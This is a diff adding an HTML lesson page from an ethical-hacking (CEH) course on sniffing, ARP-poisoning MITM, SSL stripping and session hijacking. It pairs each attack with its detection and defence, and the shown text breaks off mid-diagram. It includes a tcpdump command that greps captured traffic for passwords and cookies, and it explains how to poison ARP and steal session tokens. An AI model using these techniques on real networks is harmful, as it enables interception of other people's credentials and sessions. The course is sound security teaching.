@@ -1,0 +1,1094 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Session 09 — Sniffing, MITM, Session Hijacking, Social Engineering &amp; DoS | CEH · ITGate Academy</title>
+<meta name="description" content="CEH Diploma Session 9 — attacking the network and the human: sniffing and ARP-poisoning MITM, HTTPS downgrade, session hijacking (cookie theft, CSRF, TCP hijack), social engineering and phishing with SET, and DoS/DDoS — every attack carried to its detection SOC flip, ending in detection rules and an assessment report.">
+<link rel="stylesheet" href="../assets/css/ceh.css">
+<link rel="icon" href="../assets/img/itgate-logo.jpg">
+</head>
+<body data-session="s09">
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="../index.html">
+      <img src="../assets/img/itgate-logo.jpg" alt="ITGate Academy">
+      <span class="brand-text">
+        <span class="brand-name">ITGate Academy</span>
+        <span class="brand-sub">CEH · Session 09</span>
+      </span>
+    </a>
+    <nav class="topnav">
+      <a href="../index.html">All sessions</a>
+      <a href="../index.html#lab">Lab</a>
+      <a href="../index.html#resources">Resources</a>
+    </nav>
+  </div>
+</header>
+
+<div class="progress-wrap"><div class="wrap progress-inner" id="progressHost"></div></div>
+
+<div class="wrap section">
+<div class="page-layout">
+
+  <aside class="sidebar">
+    <h5>Session 09 · Pages</h5>
+    <ol id="sessionNav"></ol>
+    <div class="side-cta">
+      <h5>Deliverable</h5>
+      <a href="report.html">📋 Open Team Report</a>
+    </div>
+  </aside>
+
+  <article>
+
+  <svg aria-hidden="true" focusable="false" width="0" height="0" style="position:absolute">
+    <defs>
+      <marker id="ar-o" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#ff7043"/></marker>
+      <marker id="ar-c" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#22d3ee"/></marker>
+      <marker id="ar-g" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#768290"/></marker>
+      <marker id="ar-r" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#e63946"/></marker>
+      <marker id="ar-grn" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#4ade80"/></marker>
+      <marker id="ar-am" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#fbbf24"/></marker>
+      <marker id="ar-pu" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#a78bfa"/></marker>
+    </defs>
+  </svg>
+
+  <section class="page" data-title="Cover">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09</span><span class="tag cover"></span></div>
+      <h1>Session 9 &mdash; Sniffing, MITM, Session Hijacking, Social Engineering &amp; DoS</h1>
+      <p class="lede">You attacked the app. Now attack the wire it travels on, the session it carries, the human who runs it, and its availability.</p>
+    </div>
+    <div class="content">
+<div class="cover-hero">
+      <p>In Session 8 you stole a session cookie with XSS. But the cookie also travels across a <strong class="hl">network</strong>, belongs to
+      a <strong class="hl">session</strong> you can take over, is trusted by a <strong class="hl">human</strong> you can deceive, and depends on a
+      service whose <strong class="hl">availability</strong> you can deny. This session attacks all four.</p>
+      <p>You will sit in the middle of a conversation with <strong>ARP poisoning</strong>, downgrade <strong>HTTPS</strong>, steal and replay a
+      live <strong>session</strong>, forge a request the victim&#39;s browser sends for you (<strong>CSRF</strong>), build a <strong>phishing</strong>
+      credential-harvester with SET, and knock a service offline with a <strong>SYN flood</strong> and <strong>Slowloris</strong> &mdash; then, for
+      every one, sit in the defender&#39;s chair: the <strong class="hl hl-d">ARP anomaly, the cookie replay, the phishing tell, the flood
+      signature</strong>, and the fix.</p>
+      <div class="cover-meta">
+        <span>&#9201; ~4 hours</span><span>&#9670; 12 mini-labs + 5 attack labs</span><span>&#128273; Deliverable: a network &amp; human assessment report</span>
+      </div>
+    </div><div class="box intro"><span class="box-t">How this session runs</span><p>Four attack surfaces &mdash; wire, session, human, availability &mdash; each with theory, a stepped diagram that <strong>plays</strong>, and a <strong>&#9654; Prove it</strong> mini-lab. Everything runs on the isolated lab; the human attacks are simulated on consenting lab accounts only. Watch each attack, then read the log it leaves.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Below and around the app">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P02</span><span class="tag bridge">Recap &middot; where this fits</span><span class="time">&#9201; 4 min</span></div>
+      <h1>The App Does Not Live Alone</h1>
+      <p class="lede">Session 8 broke the application. Session 9 attacks everything the application depends on &mdash; the network, the session, the user, the uptime.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The thread so far</span><p>You have attacked services (S5&ndash;6), analysed malware (S7), and broken the web app (S8) &mdash; including stealing a session cookie with XSS. But that was one way to steal one token. This session widens out: the same cookie can be <strong>sniffed off the wire</strong>, the session <strong>hijacked</strong> outright, the user <strong>tricked</strong> into handing over credentials, and the whole service <strong>flooded offline</strong>. These are attacks on the environment <em>around</em> the app.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="The four attack surfaces around an application: the network path it travels, the session it maintains, the human who uses it, and its availability.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">on the LAN / on the phish</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">USER + SESSION</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">the human + their token</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">SERVICE</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">the app + its uptime</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--red)">1 · WIRE &mdash; sit in the middle (ARP poison, sniff)</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:26px">
+          <text x="352" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">2 · SESSION &mdash; steal &amp; replay the token</text>
+          <path d="M514,174 L191,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <text x="352" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">3 · HUMAN &mdash; phish the credentials</text>
+          <path d="M191,228 L514,228" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <text x="537" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">4 · AVAILABILITY &mdash; flood it offline</text>
+          <path d="M191,282 L884,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: each has a distinct, catchable signature</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>Redirect the victim&#39;s traffic through you and read credentials and tokens in transit.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Take over an authenticated session with a stolen cookie &mdash; no password needed.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>When the tech is hard, attack the person: a convincing pretext and a fake login page.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>When you cannot get in, deny everyone else: DoS/DDoS takes the service down.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>ARP anomalies, cookie reuse from a new IP, phishing indicators, and traffic-volume spikes &mdash; all detectable.</div>
+        </figure>
+      <div class="box key-takeaway"><span class="box-t">Attack the environment, not just the app</span><p><strong class="hl">The app is one target among four.</strong> The network carries its data, the session proves its identity, the human operates it, and uptime is a property you can attack. A complete tester &mdash; and defender &mdash; covers all four.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Why these attacks">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P03</span><span class="tag theory">Why &middot; the soft underbelly</span><span class="time">&#9201; 5 min</span></div>
+      <h1>Why the Network and the Human Still Win</h1>
+      <p class="lede">Encryption and patches harden the app &mdash; but a poisoned ARP table, a reused cookie, and a convincing email bypass all of it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Where the hard shell is soft</span><p>Organisations pour effort into hardening applications and servers. Attackers respond by moving to the parts that stay soft: the <strong>local network</strong> (which trusts ARP and DNS by default), the <strong>session layer</strong> (a stolen token needs no password), the <strong>human</strong> (who can be persuaded), and <strong>availability</strong> (which no amount of patching guarantees). These are not exotic &mdash; they are the reliable ways in when the front door is locked.</p></div>      <div class="stat-row">
+        <div class="stat"><span class="stat-n">Phishing</span><span class="stat-l">the leading initial-access vector in breach reports &mdash; the human is attacked more than any exploit</span></div>
+        <div class="stat"><span class="stat-n">ARP/DNS</span><span class="stat-l">trust-by-default protocols with no authentication &mdash; a local attacker becomes the man in the middle</span></div>
+        <div class="stat"><span class="stat-n">A token</span><span class="stat-l">= access without a password &mdash; steal the session and MFA on the login is already behind you</span></div>
+      </div><div class="box case"><span class="box-t">Real-world anchor &mdash; the coffee-shop session steal</span><p>Classic sidejacking: on open Wi-Fi, an attacker sniffs an unencrypted session cookie and loads it into their own browser &mdash; instantly logged in as the victim, no password, no MFA prompt (the login already happened). It is exactly why every serious site now forces HTTPS and marks cookies <span class="mono">Secure; HttpOnly; SameSite</span> &mdash; defences you will map at the end of this session.</p></div><div class="box key-takeaway"><span class="box-t">Harden everything, or the soft part wins</span><p><strong class="hl">Attackers pick the weakest layer, not the app.</strong> Network trust, session tokens, human judgement, and uptime are where effort lags &mdash; so they are where you test, and where the highest-leverage defences live.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Sniffing">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P04</span><span class="tag theory">Method &middot; read the wire</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Sniffing &mdash; Reading Traffic in Transit</h1>
+      <p class="lede">Before you can alter a conversation you must hear it. Learn passive vs active sniffing and why a switch forces you to poison ARP.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Hearing the network</span><p>Sniffing is capturing data as it crosses the network. On an old <strong>hub</strong> (or open Wi-Fi) every packet reaches everyone, so you just <strong>listen</strong> &mdash; passive. On a modern <strong>switch</strong>, traffic is delivered only to its destination port, so to see a victim&#39;s traffic you must actively <strong>redirect</strong> it to yourself &mdash; and that is where ARP poisoning comes in. Click each.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 190" role="img" aria-label="Passive versus active sniffing: a hub delivers to everyone, a switch delivers only to the destination, so active sniffing needs ARP poisoning. Click each.">
+          <g class="node" data-node="pas" tabindex="0"><rect x="30" y="45" width="400" height="110" rx="12" fill="#12241c" stroke="#4ade80"/><text class="d-title" x="230" y="80" text-anchor="middle" font-size="14" fill="#4ade80">PASSIVE</text><text class="d-sub" x="230" y="104" text-anchor="middle">hub / open Wi-Fi / mirror port &mdash; just listen</text><text class="d-sub" x="230" y="124" text-anchor="middle">silent, undetectable</text><text class="d-sub" x="230" y="144" text-anchor="middle">only works on a shared medium</text></g>
+          <g class="node" data-node="act" tabindex="0"><rect x="510" y="45" width="400" height="110" rx="12" fill="#241417" stroke="#ff7043"/><text class="d-title" x="710" y="80" text-anchor="middle" font-size="14" fill="#ff7043">ACTIVE</text><text class="d-sub" x="710" y="104" text-anchor="middle">switched network &mdash; must REDIRECT traffic</text><text class="d-sub" x="710" y="124" text-anchor="middle">needs ARP/MAC poisoning</text><text class="d-sub" x="710" y="144" text-anchor="middle">powerful, but noisy &amp; detectable</text></g>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; where it works and what it costs.</div>
+        <div class="dgm-detail" data-detail="pas"><h5><span class="dd-tag">PASSIVE</span>Listen on a shared medium</h5><p><b>On a hub, open Wi-Fi, or a SPAN/mirror port, every frame reaches your NIC &mdash; set it to promiscuous mode and capture.</b> Silent and undetectable because you send nothing. But modern switched networks deliver frames only to the destination port, so passive sniffing sees only your own traffic and broadcasts. That limitation forces the active technique.</p></div>
+        <div class="dgm-detail" data-detail="act"><h5><span class="dd-tag">ACTIVE</span>Redirect, then listen</h5><p><b>On a switch you must make the victim&#39;s traffic come to you &mdash; ARP poisoning (claim to be the gateway), MAC flooding (overflow the switch table so it fails open like a hub), or DHCP/DNS spoofing.</b> Now you are the man in the middle and can read (and alter) everything. Powerful, but it sends forged frames &mdash; which is exactly what an ARP-anomaly detector catches.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; capture your own traffic and read a cleartext credential</span><pre><code>sudo tcpdump -i eth0 -A 'tcp port 80' | grep -iE 'pass|user|cookie'
+# then log into any HTTP (not HTTPS) test page and watch the credential appear
+# HTTPS shows only encrypted bytes — which is the whole point of TLS</code></pre><p style="margin-top:8px"><b>You should see:</b> on cleartext HTTP the username, password, and cookie are right there in the capture. HTTPS turns them into noise &mdash; which is why the next attacks either need you in the middle <em>before</em> TLS, or try to strip it.</p></div><div class="box key-takeaway"><span class="box-t">Switch = you must redirect</span><p><strong class="hl">Passive listens; active redirects.</strong> A hub hands you everything; a switch forces you to poison ARP to become the man in the middle. That forged redirection is powerful &mdash; and detectable.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="ARP poisoning &amp; MITM">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P05</span><span class="tag attack">Attack &middot; become the middle</span><span class="time">&#9201; 7 min</span></div>
+      <h1>ARP Poisoning &mdash; Becoming the Man in the Middle</h1>
+      <p class="lede">ARP has no authentication, so a forged reply reroutes a victim&#39;s traffic through you. Watch the poisoning take hold.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The protocol that trusts anyone</span><p>To send to an IP on the LAN, a host asks &quot;who has this IP?&quot; via <strong>ARP</strong> and caches whatever answer comes back &mdash; with <em>no</em> verification. So you simply keep telling the victim &quot;the gateway&#39;s IP is at <em>my</em> MAC&quot; and telling the gateway &quot;the victim&#39;s IP is at <em>my</em> MAC.&quot; Both send their traffic to you; you forward it on, reading and altering as it passes. Watch it.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="ARP poisoning MITM: the attacker sends forged ARP replies to the victim and the gateway so both cache the attacker's MAC and route traffic through them.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">VICTIM</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">a LAN host</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">forges ARP</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">GATEWAY</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">the router</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">forged ARP: &quot;gateway IP = my MAC&quot;</text>
+          <path d="M514,120 L191,120" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="705" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">forged ARP: &quot;victim IP = my MAC&quot;</text>
+          <path d="M526,174 L884,174" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="352" y="214" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">victim's traffic &rarr; attacker</text>
+          <path d="M191,228 L514,228" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:-26px">
+          <text x="705" y="268" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">attacker forwards it on (stays transparent)</text>
+          <path d="M526,282 L884,282" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">SOC flip: one MAC now maps to two IPs (gateway + victim)</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The victim caches the lie: it now thinks the attacker&#39;s MAC is the gateway. No authentication in ARP means no check.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The gateway is poisoned too, so return traffic also comes to the attacker. Now both directions route through the middle.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Everything the victim sends to the internet flows through the attacker first.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>The attacker relays traffic so the victim notices nothing &mdash; while reading (and able to alter) every packet.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>ARP-anomaly detection (arpwatch, XArp) sees the gateway&#39;s IP suddenly move to a new MAC, or one MAC claiming many IPs.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; watch your own ARP table and spot a change</span><pre><code>arp -a                       # note the gateway's current MAC
+# (in a lab MITM, after poisoning, the gateway IP shows the ATTACKER's MAC)
+ip neigh | grep -i router    # same idea on Linux
+# a gateway MAC that suddenly changes = ARP poisoning in progress</code></pre><p style="margin-top:8px"><b>You should see:</b> the gateway&#39;s IP mapping to a <em>new</em> MAC &mdash; or one MAC owning several IPs &mdash; is the fingerprint of ARP poisoning. Detection is literally watching the ARP table for that change.</p></div><div class="box key-takeaway"><span class="box-t">No auth = forge at will</span><p><strong class="hl">ARP believes the last reply it hears.</strong> Forge the gateway mapping and you are the man in the middle. The defence is to watch for the mapping changing &mdash; static ARP, DAI, and port security on switches.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="HTTPS downgrade">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P06</span><span class="tag attack">Attack &middot; strip the TLS</span><span class="time">&#9201; 6 min</span></div>
+      <h1>SSL Strip &mdash; Turning HTTPS Back Into HTTP</h1>
+      <p class="lede">Being in the middle is not enough if the traffic is encrypted. Watch how a downgrade turns a secure session into a readable one &mdash; and why HSTS stops it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">MITM meets encryption</span><p>ARP poisoning puts you in the middle, but HTTPS makes the traffic unreadable. <strong>SSL stripping</strong> attacks the moment before encryption: many users type <span class="mono">http://</span> or click an HTTP link, and the server <em>redirects</em> them to HTTPS. The man in the middle intercepts that first HTTP request and keeps talking HTTP to the victim while talking HTTPS to the server &mdash; so the victim&#39;s side is cleartext. Watch it, then meet the defence that kills it.</p></div>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 370" role="img" aria-label="SSL strip: the MITM keeps an HTTP connection to the victim while proxying HTTPS to the server, so the victim's credentials travel in cleartext.">
+          <rect x="60" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="185" y="54" text-anchor="middle" font-size="14" fill="var(--cyan)">VICTIM</text>
+          <text class="d-sub" x="185" y="70" text-anchor="middle">types http://</text>
+          <line x1="185" y1="80" x2="185" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="395" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--red)"/>
+          <text class="d-title" x="520" y="54" text-anchor="middle" font-size="14" fill="var(--red)">ATTACKER (MITM)</text>
+          <text class="d-sub" x="520" y="70" text-anchor="middle">strips TLS</text>
+          <line x1="520" y1="80" x2="520" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="765" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">SERVER</text>
+          <text class="d-sub" x="890" y="70" text-anchor="middle">wants HTTPS</text>
+          <line x1="890" y1="80" x2="890" y2="348" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <text x="352" y="106" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">GET http://bank.com (cleartext)</text>
+          <path d="M191,120 L514,120" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="705" y="160" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">attacker opens HTTPS to the real server</text>
+          <path d="M526,174 L884,174" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:26px">
+          <text x="705" y="214" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--text-3)">server responds over HTTPS</text>
+          <path d="M884,228 L526,228" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+          <text x="352" y="268" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">attacker serves the page over HTTP</text>
+          <path d="M514,282 L191,282" fill="none" stroke="var(--red)" stroke-width="2.4" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+          <rect x="245" y="314" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--green)"/>
+          <text x="470" y="334" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--green)">DEFENCE: HSTS forces HTTPS &mdash; the first request is never HTTP</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The user&#39;s first request is plain HTTP &mdash; before any redirect to HTTPS. The attacker intercepts it.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>The attacker speaks proper HTTPS to the server, so the server sees a normal secure client.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Encrypted server-side &mdash; but the attacker decrypts it and re-serves it to the victim as HTTP.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4</span>The victim&#39;s browser shows a working page with no padlock &mdash; and sends the password back in cleartext.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>An HSTS policy (and preload) makes the browser refuse HTTP for that domain, so there is no cleartext request to strip.</div>
+        </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; spot the missing padlock (the victim&#39;s only tell)</span><pre><code># The victim's defence is noticing the URL is http:// not https:// and no padlock.
+# As a tester, confirm a site's HSTS (which blocks the attack):
+curl -sI https://example.com | grep -i strict-transport-security
+# a 'Strict-Transport-Security' header = the browser will refuse HTTP = strip fails</code></pre><p style="margin-top:8px"><b>You should see:</b> an <span class="mono">HSTS</span> header means the browser will never make that first cleartext request, so there is nothing to strip. Its presence or absence is the difference between &quot;strippable&quot; and &quot;safe.&quot;</p></div><div class="box key-takeaway"><span class="box-t">Strip the redirect, not the crypto</span><p><strong class="hl">SSL strip attacks the HTTP-before-HTTPS moment.</strong> It never breaks TLS &mdash; it stops TLS from starting. <span class="mono">HSTS</span> (with preload) removes the cleartext step and defeats it.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Session hijacking">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P07</span><span class="tag theory">Method &middot; steal the session</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Session Hijacking &mdash; Access Without a Password</h1>
+      <p class="lede">A session token is a bearer pass: whoever holds it is you. Learn why stealing one beats cracking a password, and how it differs from spoofing.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The token is the identity</span><p>After you log in, the app gives your browser a <strong>session token</strong> (a cookie) and trusts it on every later request &mdash; that is how you stay logged in without re-typing your password. Which means: <strong>whoever holds the token is you</strong>, password and MFA already satisfied. Session hijacking is stealing that token to take over an <em>active</em> session &mdash; distinct from spoofing, which starts a <em>new</em> session with stolen credentials.</p></div>
+      <div class="tbl-scroll">
+      <table><colgroup><col style="width:14%"><col style="width:44%"><col style="width:42%"></colgroup>
+      <thead><tr><th></th><th>Spoofing</th><th>Hijacking</th></tr></thead>
+      <tbody>
+      <tr><td><strong>What</strong></td><td>start a NEW session with stolen credentials</td><td>take over an EXISTING active session</td></tr>
+      <tr><td><strong>When</strong></td><td>before authentication</td><td>after authentication</td></tr>
+      <tr><td><strong>Needs</strong></td><td>the victim&#39;s credentials</td><td>only the session token</td></tr>
+      </tbody></table></div>
+      <div class="box intro"><span class="box-t">Why session attacks succeed</span><p>The enablers are all defensive gaps: <strong>no TLS</strong> (token sniffable), <strong>predictable or short IDs</strong> (guessable), <strong>no expiry</strong> (a stolen token works forever), <strong>no regeneration after login</strong> (fixation), and <strong>insecure storage</strong> (readable by XSS). Every one maps to a cookie-flag or config fix at the end of the session.</p></div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; find your own session token and see it is the whole identity</span><pre><code># In your browser dev-tools -> Application -> Cookies, find the session cookie
+#   (PHPSESSID, JSESSIONID, session=...).
+# Copy its value into a DIFFERENT browser's cookie for the same site and reload:
+#   you are logged in as yourself in the second browser — no password asked.
+# that is exactly what an attacker does with a STOLEN token.</code></pre><p style="margin-top:8px"><b>You should see:</b> moving the cookie value to another browser logs you straight in &mdash; proving the token alone is your identity. An attacker who steals it (next pages) gets the same result without ever knowing your password.</p></div><div class="box key-takeaway"><span class="box-t">Hold the token, be the user</span><p><strong class="hl">A session token is a bearer credential.</strong> Steal it and you are authenticated as the victim &mdash; no password, no MFA prompt. That is why token confidentiality (TLS, HttpOnly) and lifecycle (expiry, regeneration) are the defences.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="App-level hijacking">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S09 &middot; P08</span><span class="tag attack">Attack &middot; get the token</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Application-Level Hijacking &mdash; Six Ways to the Token</h1>
+      <p class="lede">If the token is the prize, here are the ways to grab it &mdash; from sniffing to XSS to setting it yourself before the victim logs in.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Many roads to one cookie</span><p>Application-level hijacking targets the token directly. The methods differ in <em>where</em> they intercept it &mdash; on the wire, in the browser, or by planting one you already know. Click each; several tie back to attacks you have already done (XSS from S8, sniffing from this session).</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 200" role="img" aria-label="Six application-level session hijacking techniques: sniffing, XSS cookie theft, prediction, fixation, replay, and man-in-the-browser. Click each.">
